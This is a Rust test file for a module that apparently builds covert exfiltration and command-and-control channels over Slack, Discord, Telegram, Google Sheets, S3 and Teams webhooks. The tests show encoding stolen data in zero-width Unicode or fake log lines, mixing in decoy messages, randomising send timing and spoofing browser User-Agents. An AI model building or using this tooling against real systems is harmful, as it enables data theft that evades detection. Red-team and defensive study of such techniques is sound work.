use super::saas_dead_drops::*;

fn slack_credential() -> SaasCredential {
    SaasCredential::new(SaasProvider::SlackWebhook, "T00000/B00000/XXXXXXXXXXXX")
}

fn discord_credential() -> SaasCredential {
    SaasCredential::new(SaasProvider::DiscordWebhook, "123456789/abcdefghijk")
}

fn telegram_credential() -> SaasCredential {
    SaasCredential::new(SaasProvider::TelegramBot, "bot123456:ABC-DEF")
        .with_channel_id("-1001234567890")
}

fn google_credential() -> SaasCredential {
    SaasCredential::new(SaasProvider::GoogleSheets, "AIzaSyXXXXXXXXX")
        .with_channel_id("1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgVE2upms")
}

fn s3_credential() -> SaasCredential {
    SaasCredential::new(
        SaasProvider::S3Presigned,
        "my-bucket/exfil/data.bin?X-Amz-Signature=abc123",
    )
}

fn teams_credential() -> SaasCredential {
    SaasCredential::new(SaasProvider::TeamsConnector, "webhook-id-12345")
}

#[test]
fn all_providers_have_valid_endpoints() {
    let providers = [
        SaasProvider::SlackWebhook,
        SaasProvider::TeamsConnector,
        SaasProvider::S3Presigned,
        SaasProvider::GoogleSheets,
        SaasProvider::DiscordWebhook,
        SaasProvider::TelegramBot,
    ];
    for p in &providers {
        assert!(
            p.api_base().starts_with("https://"),
            "{p:?} API base must be HTTPS"
        );
        assert!(p.max_message_size() > 0);
        assert!(p.recommended_chunk_size() > 0);
        assert!(p.recommended_chunk_size() <= p.max_message_size());
        assert!(p.safe_rate_limit_rpm() > 0);
    }
}

#[test]
fn all_providers_have_content_type() {
    let providers = [
        SaasProvider::SlackWebhook,
        SaasProvider::TeamsConnector,
        SaasProvider::S3Presigned,
        SaasProvider::GoogleSheets,
        SaasProvider::DiscordWebhook,
        SaasProvider::TelegramBot,
    ];
    for p in &providers {
        assert!(!p.content_type().is_empty());
    }
}

#[test]
fn slack_exfil_roundtrip() {
    let config = DeadDropConfig::new(slack_credential())
        .with_encoding(MessageEncoding::Base64Text)
        .with_cover_messages(false, 0.0);
    let mut drop = SaasDeadDrop::with_seed(config, 42);

    let payload = b"sensitive credentials extracted from target";
    let messages = drop.prepare_exfil(payload).unwrap();
    assert!(!messages.is_empty());

    for msg in &messages {
        assert_eq!(msg.provider, SaasProvider::SlackWebhook);
        assert_eq!(msg.method, "POST");
        assert!(msg.body.contains("text"));
        assert!(!msg.is_cover);
    }

    let decoded = drop.decode_messages(&messages).unwrap();
    assert_eq!(&decoded[..payload.len()], payload);
}

#[test]
fn discord_exfil_roundtrip() {
    let config = DeadDropConfig::new(discord_credential())
        .with_encoding(MessageEncoding::HexMultiField)
        .with_cover_messages(false, 0.0);
    let mut drop = SaasDeadDrop::with_seed(config, 42);

    let payload = b"exfil data through discord";
    let messages = drop.prepare_exfil(payload).unwrap();
    assert!(!messages.is_empty());

    for msg in &messages {
        assert_eq!(msg.provider, SaasProvider::DiscordWebhook);
        assert!(msg.body.contains("content"));
    }

    let decoded = drop.decode_messages(&messages).unwrap();
    assert_eq!(&decoded[..payload.len()], payload);
}

#[test]
fn telegram_exfil_roundtrip() {
    let config = DeadDropConfig::new(telegram_credential())
        .with_encoding(MessageEncoding::Base64Text)
        .with_cover_messages(false, 0.0);
    let mut drop = SaasDeadDrop::with_seed(config, 42);

    let payload = b"c2 command response data";
    let messages = drop.prepare_exfil(payload).unwrap();
    assert!(!messages.is_empty());

    for msg in &messages {
        assert_eq!(msg.provider, SaasProvider::TelegramBot);
        assert!(msg.endpoint_url.contains("sendMessage"));
        assert!(msg.endpoint_url.contains("chat_id="));
    }

    let decoded = drop.decode_messages(&messages).unwrap();
    assert_eq!(&decoded[..payload.len()], payload);
}

#[test]
fn google_sheets_exfil_roundtrip() {
    let config = DeadDropConfig::new(google_credential())
        .with_encoding(MessageEncoding::Base64Text)
        .with_cover_messages(false, 0.0);
    let mut drop = SaasDeadDrop::with_seed(config, 42);

    let payload = b"spreadsheet embedded data";
    let messages = drop.prepare_exfil(payload).unwrap();
    assert!(!messages.is_empty());

    for msg in &messages {
        assert_eq!(msg.provider, SaasProvider::GoogleSheets);
        assert!(msg.body.contains("values"));
        assert!(msg.headers.contains_key("Authorization"));
    }

    let decoded = drop.decode_messages(&messages).unwrap();
    assert_eq!(&decoded[..payload.len()], payload);
}

#[test]
fn s3_exfil_uses_put_method() {
    let config = DeadDropConfig::new(s3_credential())
        .with_encoding(MessageEncoding::Base64Text)
        .with_cover_messages(false, 0.0);
    let mut drop = SaasDeadDrop::with_seed(config, 42);

    let messages = drop.prepare_exfil(b"s3 data").unwrap();
    for msg in &messages {
        assert_eq!(msg.method, "PUT");
        assert_eq!(msg.provider, SaasProvider::S3Presigned);
    }
}

#[test]
fn teams_exfil_uses_message_card() {
    let config = DeadDropConfig::new(teams_credential())
        .with_encoding(MessageEncoding::Base64Text)
        .with_cover_messages(false, 0.0);
    let mut drop = SaasDeadDrop::with_seed(config, 42);

    let messages = drop.prepare_exfil(b"teams data").unwrap();
    for msg in &messages {
        assert_eq!(msg.provider, SaasProvider::TeamsConnector);
        assert!(msg.body.contains("MessageCard"));
    }
}

#[test]
fn zero_width_encoding_roundtrip() {
    let config = DeadDropConfig::new(slack_credential())
        .with_encoding(MessageEncoding::ZeroWidthUnicode)
        .with_cover_messages(false, 0.0);
    let mut drop = SaasDeadDrop::with_seed(config, 42);

    let payload = b"hidden in plain sight";
    let messages = drop.prepare_exfil(payload).unwrap();
    assert!(!messages.is_empty());

    let decoded = drop.decode_messages(&messages).unwrap();
    assert_eq!(&decoded[..payload.len()], payload);
}

#[test]
fn fake_log_encoding_roundtrip() {
    let config = DeadDropConfig::new(slack_credential())
        .with_encoding(MessageEncoding::FakeLogMessages)
        .with_cover_messages(false, 0.0);
    let mut drop = SaasDeadDrop::with_seed(config, 42);

    let payload = b"data hidden in log format";
    let messages = drop.prepare_exfil(payload).unwrap();
    assert!(!messages.is_empty());

    let decoded = drop.decode_messages(&messages).unwrap();
    assert_eq!(&decoded[..payload.len()], payload);
}

#[test]
fn cover_messages_interspersed() {
    let config = DeadDropConfig::new(slack_credential())
        .with_cover_messages(true, 1.0)
        .with_chunk_size(10);
    let mut drop = SaasDeadDrop::with_seed(config, 42);

    let payload = vec![0x41u8; 50];
    let messages = drop.prepare_exfil(&payload).unwrap();

    let cover_count = messages.iter().filter(|m| m.is_cover).count();
    let data_count = messages.iter().filter(|m| !m.is_cover).count();

    assert!(cover_count > 0, "should have cover messages");
    assert!(data_count > 0, "should have data messages");
}

#[test]
fn cover_message_standalone() {
    let config = DeadDropConfig::new(slack_credential());
    let mut drop = SaasDeadDrop::with_seed(config, 42);

    let cover = drop.generate_cover_message().unwrap();
    assert!(cover.is_cover);
    assert_eq!(cover.payload_bytes, 0);
    assert!(!cover.body.is_empty());
    assert_eq!(cover.provider, SaasProvider::SlackWebhook);
}

#[test]
fn empty_payload_returns_no_messages() {
    let config = DeadDropConfig::new(slack_credential());
    let mut drop = SaasDeadDrop::with_seed(config, 42);

    let messages = drop.prepare_exfil(b"").unwrap();
    assert!(messages.is_empty());
}

#[test]
fn statistics_track_correctly() {
    let config = DeadDropConfig::new(slack_credential()).with_cover_messages(false, 0.0);
    let mut drop = SaasDeadDrop::with_seed(config, 42);

    assert_eq!(drop.messages_sent(), 0);
    assert_eq!(drop.bytes_exfiltrated(), 0);
    assert_eq!(drop.cover_messages_sent(), 0);

    let _ = drop.prepare_exfil(b"test data").unwrap();
    assert!(drop.messages_sent() > 0);
    assert!(drop.bytes_exfiltrated() > 0);
}

#[test]
fn session_tag_consistent() {
    let config = DeadDropConfig::new(slack_credential()).with_cover_messages(false, 0.0);
    let mut drop = SaasDeadDrop::with_seed(config, 42);

    let tag = drop.session_tag().to_string();
    assert!(tag.starts_with("dd-"));

    let messages = drop.prepare_exfil(b"test").unwrap();
    for msg in &messages {
        assert_eq!(msg.session_tag, tag);
    }
}

#[test]
fn delay_within_bounds() {
    let config = DeadDropConfig::new(slack_credential()).with_interval(1000, 5000);
    let mut drop = SaasDeadDrop::with_seed(config, 42);

    for _ in 0..100 {
        let delay = drop.next_delay_ms();
        assert!(delay >= 1000 && delay <= 5000, "delay {delay} out of range");
    }
}

#[test]
fn multi_channel_distributes() {
    let configs = vec![
        DeadDropConfig::new(slack_credential()).with_cover_messages(false, 0.0),
        DeadDropConfig::new(discord_credential()).with_cover_messages(false, 0.0),
    ];
    let mut multi = MultiChannelDeadDrop::new(configs);
    assert_eq!(multi.channel_count(), 2);

    let _ = multi.exfil(b"data 1").unwrap();
    let _ = multi.exfil(b"data 2").unwrap();

    let stats = multi.stats();
    assert_eq!(stats.len(), 2);
    assert!(stats[0].1 > 0 || stats[1].1 > 0);
}

#[test]
fn multi_channel_empty_returns_error() {
    let mut multi = MultiChannelDeadDrop::new(Vec::new());
    let result = multi.exfil(b"data");
    assert!(result.is_err());
}

#[test]
fn credential_builder_pattern() {
    let cred = SaasCredential::new(SaasProvider::SlackWebhook, "token")
        .with_channel_id("C12345")
        .with_workspace_id("W67890")
        .with_param("custom", "value");

    assert_eq!(cred.channel_id.as_deref(), Some("C12345"));
    assert_eq!(cred.workspace_id.as_deref(), Some("W67890"));
    assert_eq!(
        cred.extra_params.get("custom").map(|s| s.as_str()),
        Some("value")
    );
}

#[test]
fn headers_include_browser_user_agent() {
    let config = DeadDropConfig::new(slack_credential()).with_cover_messages(false, 0.0);
    let mut drop = SaasDeadDrop::with_seed(config, 42);

    let messages = drop.prepare_exfil(b"test").unwrap();
    for msg in &messages {
        assert!(msg.headers.contains_key("User-Agent"));
        assert!(msg.headers.get("User-Agent").unwrap().contains("Mozilla"));
    }
}

#[test]
fn large_payload_chunks_correctly() {
    let config = DeadDropConfig::new(slack_credential())
        .with_chunk_size(50)
        .with_cover_messages(false, 0.0);
    let mut drop = SaasDeadDrop::with_seed(config, 42);

    let payload = vec![0x42u8; 500];
    let messages = drop.prepare_exfil(&payload).unwrap();
    assert!(
        messages.len() > 1,
        "large payload should produce multiple chunks"
    );

    for (i, msg) in messages.iter().enumerate() {
        assert_eq!(msg.sequence, i);
        assert_eq!(msg.total_chunks, messages.len());
    }
}
